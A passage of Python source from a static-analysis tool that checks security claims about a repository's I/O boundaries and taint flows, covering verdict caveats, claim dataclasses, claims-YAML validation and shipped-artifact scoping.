    spellings of one disclosure drift the first time either is edited, which is
    the failure this module has paid for repeatedly (L53). The boundary is in
    the prose because the caveat is boundary-SCOPED — a reader seeing
    ``sendall`` under a ``net_send`` claim needs to know that is why it was
    raised, and that an unrelated ``.get`` was deliberately not.

    THE SENTENCE SAYS WHAT IS UNKNOWN AND WHAT IS NOT. The receiver's TYPE is
    the unknown; the call site is known exactly, which is why the entries are
    checkable locations rather than a count.
    """
    if len(sites) <= _MAX_REPORTED_UNTYPED_SITES:
        where = ", ".join(sites)
    else:
        # AT SCALE THE SITES ARE NOT THE FACT; THE METHOD NAMES ARE. Measured on
        # poetry: 306 fs_read sites are 16 distinct names (``read`` 95,
        # ``exists`` 86, ``open`` 34, ``group`` 19, ``read_text`` 16, ...) and
        # 103 ipc_recv sites are a SINGLE name, ``get``. A reader deciding
        # whether to trust the verdict acts on "which methods" — ``group`` is
        # almost all ``re.Match``, ``read_text`` is almost all ``pathlib`` —
        # and cannot act on five arbitrary line numbers out of three hundred.
        # The full site list is still in ``entries``, which is the machine
        # surface; this only bounds the sentence a human reads, the same trade
        # ``_MAX_REPORTED_UNCATALOGUED_MODULES`` and ``_MAX_EVIDENCE_ROWS``
        # already make.
        names = sorted({_site_method(s) for s in sites})
        more = len(names) - _MAX_REPORTED_UNTYPED_SITES
        suffix = f" (+{more} more)" if more > 0 else ""
        shown = ", ".join(names[:_MAX_REPORTED_UNTYPED_SITES])
        where = (
            f"{len(names)} distinct method(s): {shown}{suffix}; "
            f"the full site list is in this caveat's `entries`"
        )
    return {
        "kind": CAVEAT_UNTYPED_RECEIVER,
        # CARRIED, NOT RE-DERIVED. ``_merge_caveat`` re-renders a widened entry
        # list so the prose cannot quote a stale count, and it can only do that
        # for a caveat that says what it is about. The opaque kind needs no such
        # field because its sentence names no scope.
        "boundary": boundary,
        # CARRIED FOR THE SAME REASON AS ``boundary``: ``_merge_caveat``
        # re-renders a widened entry list, and it can only reproduce the
        # sentence it started from if the caveat says which arm raised it.
        "arm": arm,
        "entries": list(sites),
        "detail": (
            f"The claim holds everywhere the analysis could see. At "
            f"{len(sites)} call site(s) — {where} — a method the {boundary} "
            f"{_UNTYPED_SCOPE_NOUN[arm]} declares is called on a receiver "
            f"whose type could not be determined, "
            f"{_UNTYPED_CONSEQUENCE[arm]}."
        ),
    }


def _analyzer_method_call_blind_caveat(
    languages: list[str],
) -> dict[str, Any]:
    """The one place the declared-blindness disclosure is built.

    NAMES THE LANGUAGE AND THE SCALE, because "some calls were not seen" is
    unactionable while "kotlin: 181 of 186 catalogued primitives are
    method-kind" tells a reader whether this verdict is worth anything for
    their repository. The count comes from the shipped catalogue rather than
    from a literal here, so it cannot go stale against the catalogue it
    describes.
    """
    from .analyzer_disclosure import DECLARATIONS
    from .io_boundary import load_catalog

    parts = []
    for lang in languages:
        prims = load_catalog(lang).primitives
        methods = sum(1 for p in prims if getattr(p, "kind", None) == "method")
        parts.append(f"{lang} ({methods} of {len(prims)} catalogued primitives "
                     f"are method-kind)")
    measured = sorted({
        DECLARATIONS[lang].measured for lang in languages
        if lang in DECLARATIONS
    })
    when = f" Declared {'/'.join(measured)}." if measured else ""
    return {
        "kind": CAVEAT_ANALYZER_METHOD_CALL_BLIND,
        "entries": list(languages),
        "detail": (
            f"This verdict rests on {'a language' if len(languages) == 1 else 'languages'} "
            f"whose analyzer emits no call edge for an external "
            f"instance-method call, so calls of that shape were never seen and "
            f"could be neither adjudicated nor disclosed individually: "
            f"{', '.join(parts)}.{when}"
        ),
    }


def _analyzer_suppressed_methods_caveat(
    entries: dict[str, list[str]],
) -> dict[str, Any]:
    """The one place the suppressed-sink-name disclosure is built.

    NAMES THE METHODS, not just the count, because the reader's question is
    "does my code call one of these?" and only the list answers it. A reader
    who sees ``send`` can check their sockets; a reader who sees "9 methods"
    cannot check anything.
    """
    parts = [
        f"{lang} ({', '.join(sorted(names))})"
        for lang, names in sorted(entries.items())
    ]
    return {
        "kind": CAVEAT_ANALYZER_SUPPRESSED_METHODS,
        "entries": sorted(entries),
        "detail": (
            "This verdict is closed-world over the method names the analysis "
            "models. Some methods the I/O catalogue declares as sinks are "
            "deliberately not resolved by name, because without a receiver "
            "type a name-only match binds unrelated calls together — so a "
            "call to one of them on an untypable receiver was neither "
            "adjudicated nor individually disclosed: " + "; ".join(parts) + "."
        ),
    }


def _unknown_receiver_scope_caveat(
    sites: int, method_calls: int, names: list[str],
) -> dict[str, Any]:
    """The one place the closed-world disclosure is built.

    THE SENTENCE IS ABOUT THE VERDICT'S SCOPE, NOT ABOUT A SITE. Its sibling
    names checkable locations because it knows something about them — the
    catalogue declares that method for this boundary. Here the whole point is
    that nothing is known about them, so what a reader can act on is the SIZE of
    the unknown and WHICH METHODS it covers: 1-of-3 and 1-of-3000 are different
    verdicts, and ``append``/``items`` reads very differently from
    ``upload_file``/``post``. Measured on the corpus: 34.7% of untyped-receiver
    sites are builtin container/string method names, which is exactly the
    calibration a bare "some receivers were unknown" would deny the reader.
    """
    more = len(names) - _MAX_REPORTED_UNTYPED_SITES
    suffix = f" (+{more} more)" if more > 0 else ""
    shown = ", ".join(names[:_MAX_REPORTED_UNTYPED_SITES])
    return {
        "kind": CAVEAT_UNKNOWN_RECEIVER_SCOPE,
        # The distinct METHOD NAMES, not the sites: see the docstring. The
        # machine surface and the sentence agree on the same list, so a
        # consumer and a human cannot come to different readings.
        "entries": list(names),
        "sites": sites,
        "method_calls": method_calls,
        "detail": (
            f"This verdict is closed-world over the receivers the analysis "
            f"could type. At {sites} of {method_calls} method call site(s) the "
            f"receiver's type could not be determined, so the catalogue could "
            f"not be asked what those calls do — distinct method(s): "
            f"{shown}{suffix}."
        ),
    }
# WI-kikis: cap on the per-verdict structured drill-down evidence list. A
# violated claim can have thousands of flows (3,969 on the self-corpus); the
# deduplicated ``evidence`` list is bounded to this many DISTINCT flows so the
# JSON stays a reasonable size, while ``evidence_count`` still reports the true
# total and ``details`` discloses the distinct count. 100 distinct source→sink
# paths is far more than a human triages by hand and comfortably covers the
# handful of distinct flows a high-count claim collapses to in practice.
_MAX_EVIDENCE_ROWS = 100


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------


@dataclass
class TaintFlowConstraint:
    """Taint-flow constraint for ADR-0017 claims.

    Attributes:
        source_taint: Taint label that must not reach the sink zone.
        prohibited_sink_zone: Zone where tainted data must not arrive.
        allowed_sanitizers: Sanitizer names that neutralize the taint (optional).
    """

    source_taint: str
    prohibited_sink_zone: str
    allowed_sanitizers: list[str] = None  # type: ignore[assignment]

    def __post_init__(self) -> None:
        if self.allowed_sanitizers is None:
            self.allowed_sanitizers = []


@dataclass
class Claim:
    """A security claim to verify against a boundary map or taint-flow analysis.

    Attributes:
        id: Unique identifier.
        text: Human-readable description.
        constraint_boundary: Which I/O boundary type to check (ADR-0016).
        constraint_must_not_exist: If true, the boundary must have 0 chains.
        constraint_max_chains: Maximum allowed chains for the boundary.
        constraint_taint_flow: Taint-flow constraint (ADR-0017, optional).
    """

    id: str
    text: str
    constraint_boundary: str = ""
    constraint_must_not_exist: bool = False
    constraint_max_chains: Optional[int] = None
    constraint_taint_flow: Optional[TaintFlowConstraint] = None


@dataclass
class ClaimVerdict:
    """Result of verifying a single claim.

    Attributes:
        claim_id: The claim's ID.
        claim_text: The claim's human-readable text.
        verdict: One of "confirmed", "confirmed_with_caveats", "violated",
            "inconclusive" (ADR-0033 Phase 3 PR4 / WI-rolol sub-task A;
            fourth value per ADR-0016 §4 and INV-pojib). ``confirmed``
            means the claim was actively checked and held on the
            analysis's own evidence; ``violated`` means specific evidence
            contradicted it; ``inconclusive`` means the verification
            couldn't proceed (no matching constraint, broken input data,
            missing catalog) — distinguished from ``confirmed`` to close
            the silent-confirm fall-through class (INV-bitig P0,
            INV-gobob, INV-mofih, INV-nufob).

            ``confirmed_with_caveats`` means the claim held, but part of
            the reasoning rests on something the tool could not verify —
            today, an entry the ANALYSED REPOSITORY supplied about
            itself. It is a CONFIRMING verdict (see
            :data:`CONFIRMING_VERDICTS`), so the coverage gate still
            reaches it and blindness still downgrades it all the way to
            ``inconclusive``. See ``caveats`` for what qualified it.
        caveats: Structured reasons the verdict is ``confirmed_with_caveats``,
            empty otherwise. Each entry is ``{"kind": ..., "entries": [...],
            "detail": ...}``. ``kind`` is the machine-branchable axis —
            currently only :data:`CAVEAT_USER_SUPPLIED_SANITIZER`, and the
            structure is a LIST of typed entries rather than a bool because
            ADR-0016 §4's original consumer (opaque boundaries that could not
            be verified) is the second kind and should not need a second
            field. Shipped with exactly one kind populated.
        evidence_count: Number of I/O chains that violate the claim (0 if confirmed).
        details: Human-readable explanation.
        evidence: Bounded, deduplicated list of per-flow drill-down records for
            a violated taint claim (WI-kikis). Each entry carries
            ``source_symbol`` / ``sink_symbol`` (the graph node IDs a consumer
            uses to locate the exact edge), the corresponding primitive names,
            and the ``path`` (list of symbol IDs through the call graph). Empty
            for confirmed / inconclusive / boundary verdicts. Capped at
            ``_MAX_EVIDENCE_ROWS`` DISTINCT flows — ``evidence_count`` remains
            the full total, so ``len(evidence) < evidence_count`` signals either
            verbatim-duplicate flows collapsed away or a high-count claim
            truncated to the cap.
        excluded_flows: Counts of flows that MATCHED the claim's constraint but
            were not counted against it, keyed by why (WI-bifob). Empty when
            nothing was excluded. This is a disclosure bucket in the D7 shape —
            a production default plus a labelled, counted account of what the
            default left out — not a silent filter. A silent drop would make
            the tool quieter without making it more honest, and the vanished
            count is exactly what a later session rediscovers as a mystery
            regression. Keys are ``migration_sourced`` plus one per rule that
            ``paths.classify_test_file`` can fire: ``test_sourced``,
            ``mock_sourced``, ``fixture_sourced``, ``benchmark_sourced``,
            ``test_support_sourced``. The split exists because
            ``is_test_file`` is deliberately broad and reporting a ``benches/``
            path as ``test_sourced`` sends the reader looking for a test that
            does not exist. Which flows are excluded is unchanged by the split.
        flow_origins: Counts of the flows this verdict IS about, keyed by the
            io_primitives boundary their source came from (WI-vazal). Empty
            when there are no flows. The taint label alone cannot express
            this: ``AUTO_SOURCE_LABEL_MAP`` collapses ``net_recv``,
            ``ipc_recv`` and ``db_read`` into the single label
            ``untrusted_input``, so "a request body reached the database" and
            "a row read from the database reached the database" were
            indistinguishable — and on an ORM-backed application the second
            dominates. This reports the split WITHOUT relabelling anything,
            so no already-published claim changes meaning. ``declared`` is the
            bucket for YAML-declared sources, which have no boundary.
        sanitized_flows: How many flows matched this claim's label and sink
            zone but were NOT counted against it because a sanitizer lies on
            every route (0 when none). The sibling of ``excluded_flows``, and
            the same D7 shape: the barrier used to prune the flow into
            silence, so a developer reading a clean verdict could not tell "no
            path exists" from "a path exists and your ``encrypt()`` call is
            what makes it safe". Only the second tells them what breaks if
            they delete that call.
        analysis_methods: Counts of the flows this verdict IS about, keyed by
            HOW each was adjudicated (INV-karud clause c). Empty when there
            are no counted flows. Same shape and rationale as
            ``flow_origins``: the pipeline computed this and the consumer
            could not see it. ``ddg`` means the ADR-0017 §3a walk found a data
            dependence; ``ddg_mixed`` means the walk ran and did not confirm
            one, so inclusion rests on call-graph reachability; ``structural``
            means no reaching-def data existed for the language and no walk
            was possible. ``confidence`` collapses the last two into
            ``approximate``, which is why this is the finer axis and the one
            worth carrying — "the analysis looked and found nothing" and "the
            analysis could not look" are different facts about a security
            verdict.
    """

    claim_id: str
    claim_text: str
    # axis: bounded-enum — "confirmed" / "confirmed_with_caveats" / "violated"
    # / "inconclusive"
    verdict: str
    evidence_count: int = 0
    details: str = ""
    evidence: list[dict[str, Any]] = field(default_factory=list)
    excluded_flows: dict[str, int] = field(default_factory=dict)
    flow_origins: dict[str, int] = field(default_factory=dict)
    analysis_methods: dict[str, int] = field(default_factory=dict)
    sanitized_flows: int = 0
    caveats: list[dict[str, Any]] = field(default_factory=list)
    #: Language -> the pass IDs that produced the call edges this verdict rests
    #: on (WI-lagod). The second half of the owner's 2026-08-23 bar: a clean
    #: verdict must name what it could not examine AND AT WHAT FIDELITY.
    analysis_fidelity: dict[str, list[str]] = field(default_factory=dict)

    def to_dict(self) -> dict:
        """Serialize to JSON-friendly dict."""
        return {
            "claim_id": self.claim_id,
            "claim_text": self.claim_text,
            "verdict": self.verdict,
            "evidence_count": self.evidence_count,
            "details": self.details,
            "evidence": self.evidence,
            "excluded_flows": self.excluded_flows,
            "flow_origins": self.flow_origins,
            "analysis_methods": self.analysis_methods,
            "sanitized_flows": self.sanitized_flows,
            "caveats": self.caveats,
            "analysis_fidelity": self.analysis_fidelity,
        }


@dataclass
class BoundaryCoverage:
    """Whether the I/O boundary analysis is trustworthy enough to *confirm* a
    zero-chain ``must_not_exist`` / within-limit ``max_chains`` claim.

    A clean (zero-chain) boundary verdict only means "this boundary is unused"
    if the analysis could actually have detected the I/O. Three blind spots make
    a clean verdict untrustworthy (WI-kajil / INV-bitig P0):

    * the analysis produced no call edges at all (empty repo, wrong cwd, or an
      unanalyzable input) — nothing could be traced to an I/O primitive; or
    * a *supported* language (one with an I/O catalog) was analyzed but
      produced zero call edges, so ``io_boundary`` saw none of its I/O — the
      F69.A1 missing-edge-production case (e.g. the JS body-call gap); or
    * the analysis called out to a module the catalog has no opinion about —
      ``requests``, ``sqlmodel``, ``boto3``. The first two spots ask "did this
      language produce ANY call edges", and a language producing hundreds of
      thousands passes them while every third-party I/O call goes unexamined.
      Measured live on unmodified upstream repos: poetry's ``src/poetry``
      returned ``confirmed`` for "never sends data over the network" (14 files
      import ``requests``) *in the same run* that correctly reported 20
      ``fs_read`` chains, so the analysis was demonstrably not blind — it
      looked, could not classify ``requests``, and reported the silence as
      safety. See :func:`_uncatalogued_external_modules` for the predicate and
      the residual it deliberately leaves open.

    When ``complete`` is ``False``, :func:`verify_claim` returns
    ``inconclusive`` instead of ``confirmed`` so verify-claims never asserts a
    boundary is unused on an analysis that couldn't see it. ``reason`` is a
    human-readable explanation surfaced in the verdict details.
    """

    complete: bool
    reason: str = ""
    #: Qualified primitive names where control leaves the process
    #: (``subprocess.run``, ``os.execv``). Populated only when opacity is what
    #: made coverage incomplete; empty otherwise.
    opaque_sites: list[str] = field(default_factory=list)
    #: True when those launch sites are the SOLE remaining blocker — every
    #: other coverage check passed. This is the difference between a
    #: DISCLAIMER and a QUALIFIED OPINION (ADR-0016 §4): "I could not form a
    #: view" versus "I examined everything I could see, except these named
    #: doors". Derived inside :func:`compute_boundary_coverage` rather than
    #: passed in, because a gate whose caller can forget to arm it fails open
    #: (the INV-dabov lesson).
    #:
    #: An opaque launch BESIDE a genuinely uncatalogued module is still
    #: blindness: the reader cannot tell which gap the silence came from, so
    #: the qualification is withheld.
    qualifying_only: bool = False
    #: Boundary -> call sites reaching a catalogued METHOD for that boundary
    #: through a receiver of unknown type (INV-fibis). Populated on EVERY
    #: coverage result, including a complete one, and that is the difference
    #: from :attr:`opaque_sites`: an untyped receiver does NOT make coverage
    #: incomplete — the residual in :func:`_uncatalogued_external_modules`
    #: stands unchanged, deliberately — it QUALIFIES a verdict that is
    #: otherwise clean. Keyed by boundary so a caller cannot widen the scope by
    #: forgetting to apply it; see :func:`untyped_receiver_sites` for why the
    #: unscoped version of this signal was measured and refused.
    untyped_receiver_sites: dict[str, list[str]] = field(default_factory=dict)
    #: ``(untyped sites, method call sites, distinct method names)`` over the
    #: WHOLE analysis, unscoped by boundary (INV-fibis). Its sibling above
    #: answers "which calls did it see but not adjudicate FOR THIS BOUNDARY";
    #: this answers "how much of the analysis was closed-world at all", which is
    #: the question a name-keyed signal structurally cannot answer about a
    #: receiver whose type is unknown. Populated on EVERY coverage result for
    #: the same fail-closed reason as its sibling.
    unknown_receiver_scope: tuple[int, int, list[str]] = field(
        default_factory=lambda: (0, 0, []),
    )
    #: Taint sink ZONE -> call sites reaching a catalogued sink for that zone
    #: through a receiver of unknown type (INV-nuhun). The taint arm's
    #: counterpart to :attr:`untyped_receiver_sites`, and carried on the same
    #: object so one run cannot disclose on the boundary arm and stay silent on
    #: the taint arm about the SAME call — the asymmetry that item names.
    #:
    #: Stamped by the CLI rather than by :func:`compute_boundary_coverage`,
    #: which is the one place in this dataclass where that is true and is a
    #: sequencing fact, not a design preference: the taint sink catalogue is
    #: loaded only when a taint claim or flag is present, which happens AFTER
    #: coverage is computed. The default is empty, so a run with no taint
    #: claims carries no taint disclosure — correct, because it reaches no
    #: taint verdict to qualify.
    untyped_receiver_zones: dict[str, list[str]] = field(default_factory=dict)
    #: Languages PRESENT in this analysis whose analyzer is declared not to
    #: emit an external instance-method call edge, and whose catalogue declares
    #: method-kind sinks that blindness therefore hides
    #: (:mod:`hypergumbo_core.analyzer_disclosure`).
    #:
    #: Carried here rather than recomputed per claim for the reason every other
    #: field on this object is: :func:`compute_boundary_coverage` is the one
    #: place a disclosure can be attached where no caller can forget it. Unlike
    #: its neighbours this one is NOT derived from the edge set — it cannot be,
    #: which is the whole point — so it is the only field on this dataclass
    #: whose value comes from a declaration rather than a measurement of the
    #: run.
    method_call_blind_languages: list[str] = field(default_factory=list)
    #: Language -> the method names its analyzer declines to model that the
    #: language's own I/O catalogue declares as METHOD-kind sinks (INV-polad).
    #:
    #: Like :attr:`method_call_blind_languages` and unlike every other field
    #: here, this is not read off the edge set: the suppressed calls left no
    #: edge to read. It is the intersection of a DECLARATION (the analyzer's
    #: own denylist, which now lives in ``analyzer_disclosure`` so there is one
    #: copy) with the shipped catalogue.
    suppressed_sink_methods: dict[str, list[str]] = field(default_factory=dict)
    #: Language -> pass IDs behind its call edges (WI-lagod). Carried here for
    #: the reason every field on this object is: one computation site the
    #: verdict paths share, so a caller cannot forget it.
    analysis_fidelity: dict[str, list[str]] = field(default_factory=dict)
    #: Language -> the name of a higher-fidelity backend INSTALLED on this
    #: machine that did NOT run. Passed in rather than derived, because
    #: "installed" is a fact about the machine and this module reasons about an
    #: edge set; deriving it here would mean this module shelling out.
    higher_fidelity_available: dict[str, str] = field(default_factory=dict)


# ---------------------------------------------------------------------------
# Claim loading
# ---------------------------------------------------------------------------


class ClaimsFileError(Exception):
    """Raised by :func:`load_claims` when the claims YAML cannot be loaded
    as a well-formed set of claims.

    Covers the four failure classes that previously either tracebacked or
    silently degraded the verdict stream — the META-jurig ``load_claims``
    validation gate:

    * malformed YAML (``yaml.YAMLError``) — INV-zurih;
    * an unexpected root / claim / constraint shape — WI-fuhaf;
    * a ``constraint.boundary`` outside the io-boundaries vocabulary —
      INV-gobob / WI-ruzib;
    * an unrecognized field name, e.g. the typo ``constrant`` — WI-bopoz.

    :func:`hypergumbo_core.cli.cmd_verify_claims` catches it, prints
    ``Error: <message>`` to stderr, and exits ``2`` — distinct from ``1``
    (a genuine ``violated`` verdict) so a CI gate keyed on ``rc == 0`` still
    fails closed on a typo'd claim without misreporting a security
    regression, and distinct from ``0`` so malformed input can never read
    as "all confirmed".
    """


# Field-name allowlists for the claims YAML (WI-bopoz). An unrecognized key
# is a typo or a misremembered field; both previously loaded a
# defaults-populated Claim whose ``inconclusive`` verdict was
# indistinguishable from a claim that legitimately lacks a checker.
# Rejecting unknown keys at load time makes the typo loud.
_ALLOWED_TOP_LEVEL_KEYS: frozenset[str] = frozenset({
    "claims", "extra_catalogs", "analysis_scope",
})

#: Valid values for the top-level ``analysis_scope:`` key. ``production`` is
#: the absent-key default and is exactly today's behaviour; ``shipped_artifact``
#: narrows the proof to the packaging-declared source trees (INV-dabuf G1).
_ANALYSIS_SCOPES: frozenset[str] = frozenset({"production", "shipped_artifact"})
_ALLOWED_CLAIM_KEYS: frozenset[str] = frozenset({"id", "text", "constraint"})
_ALLOWED_CONSTRAINT_KEYS: frozenset[str] = frozenset(
    {"boundary", "must_not_exist", "max_chains", "taint_flow"},
)
_ALLOWED_TAINT_FLOW_KEYS: frozenset[str] = frozenset(
    {"source_taint", "prohibited_sink_zone", "allowed_sanitizers"},
)


def _did_you_mean(value: str, vocabulary) -> str:
    """Return a ``' Did you mean: ...?'`` suffix for close matches, else ''.

    Mirrors the subcommand did-you-mean hint in ``cli.py`` (difflib,
    cutoff 0.5) so a near-miss boundary or field name gets a correction.
    """
    import difflib

    close = difflib.get_close_matches(value, sorted(vocabulary), n=3, cutoff=0.5)
    if close:
        return f" Did you mean: {', '.join(close)}?"
    return ""


def _reject_unknown_keys(observed, allowed: frozenset[str], *, where: str) -> None:
    """Raise :class:`ClaimsFileError` if ``observed`` has a key outside ``allowed``.

    The message lists the offending key(s), the allowed set, and a
    did-you-mean hint for the first unknown key (WI-bopoz).
    """
    unknown = sorted(str(key) for key in observed if key not in allowed)
    if not unknown:
        return
    listed = ", ".join(repr(key) for key in unknown)
    allowed_list = ", ".join(sorted(allowed))
    hint = _did_you_mean(unknown[0], allowed)
    raise ClaimsFileError(
        f"unknown {where} field(s): {listed} (allowed: {allowed_list}).{hint}",
    )


def load_extra_catalog_paths(
    path: Path,
) -> tuple[list[Path], list[Path], list[Path], list[Path]]:
    """Read ``extra_catalogs:`` from a claims YAML and return its path lists.

    The claims file may declare project-local taint catalog files under a
    top-level ``extra_catalogs`` key (WI-votan)::

        extra_catalogs:
          sources:
            - taint/project_sources.yaml
            - taint/extra_sources_dir
          sinks:
            - taint/project_sinks.yaml
          sanitizers: []
          io_primitives:
            - overlays/python-http-clients.yaml

    Each entry is a YAML file or a directory of YAML files.  Relative
    paths resolve against the claims-file directory so a repo can keep
    its extra catalogs beside the claims document.

    Returns ``(sources, sinks, sanitizers, io_primitives)`` — each a list
    of ``Path`` values that callers can concatenate onto CLI-supplied
    paths.  The first three feed
    :func:`hypergumbo_core.taint.load_full_taint_catalog`; the fourth
    feeds :func:`hypergumbo_core.io_boundary.load_catalog` (INV-fotav).

    ``io_primitives`` is read HERE rather than through a second loader
    because ``extra_catalogs:`` is already the one place a claims file
    declares project-local knowledge — the boundary arm was simply never
    given a key in it, even though ADR-0017 established the pattern for
    the taint arm.
    """
    content = path.read_text(encoding="utf-8")
    data = yaml.safe_load(content) or {}
    extras = data.get("extra_catalogs") or {}
    base_dir = path.parent

    def _resolve_rel(raw: object) -> list[Path]:
        if not raw:
            return []
        if not isinstance(raw, list):
            return []
        out: list[Path] = []
        for entry in raw:
            if not isinstance(entry, str):
                continue
            pp = Path(entry)
            if not pp.is_absolute():
                pp = base_dir / pp
            out.append(pp)
        return out

    return (
        _resolve_rel(extras.get("sources")),
        _resolve_rel(extras.get("sinks")),
        _resolve_rel(extras.get("sanitizers")),
        _resolve_rel(extras.get("io_primitives")),
    )


def load_analysis_scope(path: Path) -> str:
    """Read the top-level ``analysis_scope:`` declaration from a claims file.

    THE SCOPE LIVES IN THE CLAIMS FILE because the claims file is what a
    reader audits: a proof must not be quietly narrower than the document
    that states it. The runtime discloses the scope on stderr as well, the
    same double-entry bookkeeping overlays get.

    ``production`` (the absent-key default) is byte-for-byte today's
    behaviour. ``shipped_artifact`` narrows the walked edge population to the
    packaging-declared source trees (:func:`shipped_artifact_roots`) — the fix
    for the moving denominator that kept hypergumbo's own self-proof
    unreachable: every claim governs the shipped CLI, yet a call from
    ``scripts/`` or a repo hook blocked claims it cannot participate in, so
    any new import anywhere in the tree re-broke the proof (INV-dabuf).

    An unknown value is LOUD, not defaulted: silently reading a typo as
    ``production`` would hand the author back exactly the denominator they
    opted out of, and the mistake would present as verdicts that ignore the
    declaration — a fix that lands and changes nothing.
    """
    data = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
    scope = data.get("analysis_scope", "production")
    if scope not in _ANALYSIS_SCOPES:
        valid = ", ".join(sorted(_ANALYSIS_SCOPES))
        raise ClaimsFileError(
            f"unknown analysis_scope {scope!r} in {path}; valid scopes: "
            f"{valid}.",
        )
    return str(scope)


#: Directory names never walked for packaging metadata. Vendored and
#: environment trees carry pyproject.toml files that are somebody else's
#: packaging, not this repo's shipped surface.
_NON_PACKAGE_DIRS: frozenset[str] = frozenset({
    "node_modules", "vendor", "__pycache__",
})


def shipped_artifact_roots(repo_root: Path) -> list[str]:
    """Repo-relative source roots of what this repository SHIPS.

    THE BOUNDARY IS A FACT ABOUT PACKAGING, checkable independently of the
    analysis whose completeness is in question — which is what separates this
    from the reachability scoping rejected on INV-dabuf's thread (that one was
    computed by the very analysis under test and failed open by construction).
    A hand-rolled path list (``scripts/``, ``.githooks/``) was rejected there
    too; reading ``pyproject.toml`` means a repo that ships shell as console
    entry points keeps it in scope, because its own metadata says so.

    Resolution, python packaging only today (other ecosystems when a claims
    file in one needs it):

    - every non-hidden ``pyproject.toml`` carrying a ``[project]`` table
      names a package directory;
    - a package directory that is an ANCESTOR of another is a workspace
      wrapper, not a package, and is dropped — hypergumbo's own root
      pyproject sits above six real packages, and keeping it would widen the
      scope back to the whole repo, making the feature a measured no-op on
      the proof it exists for;
    - the shipped tree is ``<dir>/src`` when it exists (src layout), else
      ``<dir>`` itself (flat layout).

    NO METADATA IS AN ERROR, not an empty list: an empty root set would
    exclude every edge and report the resulting empty analysis as blindness,
    when the actual problem is that the declared scope has nothing to bind to.
    """
    candidates: list[Path] = []
    for pp in sorted(repo_root.rglob("pyproject.toml")):
        rel = pp.relative_to(repo_root)
        parts = rel.parts[:-1]
        if any(p.startswith(".") or p in _NON_PACKAGE_DIRS for p in parts):
            continue
        # REUSED, NOT REIMPLEMENTED: profile._load_toml already carries the
        # tomllib/tomli 3.10 fallback and the parse-failure-is-None contract.
        # A malformed manifest names no package.
        from .profile import _load_toml
        try:
            manifest = _load_toml(pp.read_text(encoding="utf-8"))
        except OSError:  # pragma: no cover — unreadable file names no package
            continue
        if not manifest or "project" not in manifest:
            continue
        candidates.append(pp.parent)
    kept = [
        d for d in candidates
        if not any(d != other and d in other.parents for other in candidates)
    ]
    if not kept:
        raise ClaimsFileError(
            f"analysis_scope: shipped_artifact declared but no pyproject.toml "
            f"with a [project] table was found under {repo_root} — the scope "
            f"has nothing to bind to. Remove the declaration or add packaging "
            f"metadata.",
        )
    roots = []
    for d in kept:
        src = d / "src"
        root = src if src.is_dir() else d
        roots.append(root.relative_to(repo_root).as_posix())
    return sorted(roots)


def edge_in_artifact(edge: dict[str, Any], roots: list[str]) -> bool:
    """Does this edge ORIGINATE in the shipped artifact?

    Judged on the src symbol's path slot: the proof asks what the shipped
    code does, and an edge is an action of its caller. Matching is at a path
    COMPONENT boundary, never a string prefix — ``packages/a/src-extras``
    shares a prefix with ``packages/a/src`` and no path component, and a
    prefix rule over names was measured wrong in three languages at once.

    A src whose second slot is not a repo path (an external placeholder in
    caller position, a malformed id) is OUT: it is not shipped code, and the
    strict direction cannot suppress a detection — coverage gates only the
    all-clear.
    """
    src = str(edge.get("src", ""))
    if len(src.split(":")) < 5:
        return False
    # PATH SLOT VIA THE CHOKEPOINT (INV-divuf). ``parts[1]`` truncates any
    # colon-bearing path — ``dart:io`` became ``dart`` — so a shipped-artifact
    # scope could silently exclude a file it was meant to include.
    path = symbol_path_slot(src)
    # A root of "." means a flat single-package repo whose package dir IS the
    # repo root; every repo-relative path is inside it.
    return any(
        root == "." or path == root or path.startswith(root + "/")
        for root in roots
    )


def node_in_artifact(
    node: dict[str, Any], roots: list[str], repo_root: Path,
) -> bool:
    """Does this node's FILE live in the shipped artifact?

    The language census walks NODES while the coverage check walks EDGES, and
    the two must describe one population (INV-sarum) — re-learned live the
    hour artifact scope first ran: with edges scoped and nodes not, bash /
    javascript / typescript read as "analyzed but produced no call edges" and
    the analyzer-blind check blocked every claim on languages the artifact
    does not contain.

    Judged on ``node["path"]``, RELATIVIZED first: js_ts nodes have carried
    absolute paths where every other analyzer computes a relative one (the
    standing landmine), and matching the raw string against a relative root
    would silently drop a genuinely-shipped js file from the census — which
    disarms the analyzer-blind check for a language the artifact DOES contain,
    the confirming direction. A pathless node (an external symbol) is not a
    file of the artifact.
    """
    raw = node.get("path")
    if not raw:
        return False
    path = Path(str(raw))
    if path.is_absolute():
        try:
            path = path.relative_to(repo_root)
        except ValueError:
            return False
    posix = path.as_posix()
    return any(
        root == "." or posix == root or posix.startswith(root + "/")
        for root in roots
    )


def _parse_taint_flow(
    taint_flow_data: object,
    claim_id: str,
) -> Optional[TaintFlowConstraint]:
    """Validate and build the optional ``taint_flow`` sub-constraint (ADR-0017).

    ``None`` (key absent or explicit null) yields ``None``; a non-mapping or
    an unrecognized key raises :class:`ClaimsFileError` rather than being
    silently ignored.
    """
    if taint_flow_data is None:
        return None
    if not isinstance(taint_flow_data, dict):
        raise ClaimsFileError(
            f"taint_flow in claim '{claim_id}' must be a mapping, "
            f"got {type(taint_flow_data).__name__}.",
        )
    _reject_unknown_keys(
        taint_flow_data.keys(),
        _ALLOWED_TAINT_FLOW_KEYS,
        where=f"taint_flow in claim '{claim_id}'",
    )
    return TaintFlowConstraint(
        source_taint=taint_flow_data.get("source_taint", ""),
        prohibited_sink_zone=taint_flow_data.get("prohibited_sink_zone", ""),
        allowed_sanitizers=taint_flow_data.get("allowed_sanitizers", []),
    )


#: The catalogue layers a verdict can rest on, in ASCENDING precedence within
#: each kind. Fixed and always emitted so a consumer never has to read a
#: missing key as "none" — the same convention ``dataflow_coverage`` follows.
_PROVENANCE_KINDS: tuple[str, ...] = (
    "io_primitives",
    "taint_sources",
    "taint_sinks",
    "taint_sanitizers",
)


def catalog_provenance(
    layers: "Mapping[str, tuple[Sequence[Path], Sequence[Path]]]",
) -> dict[str, Any]:
    """Record which catalogues a verdict was computed against (INV-zosun).

    THE PROBLEM THIS EXISTS FOR. A ``confirmed`` reached against the shipped
    catalogue and a ``confirmed`` reached against a repo-supplied overlay were
    byte-identical, in the text output and in the ``--json`` envelope alike.
    The only signal was one stderr line naming the overlay path: not attached
    to the verdict, absent from the envelope, and gone the instant anyone
    redirected the output.

    THAT IS NOT COSMETIC, because a catalogue row is not a detection-only
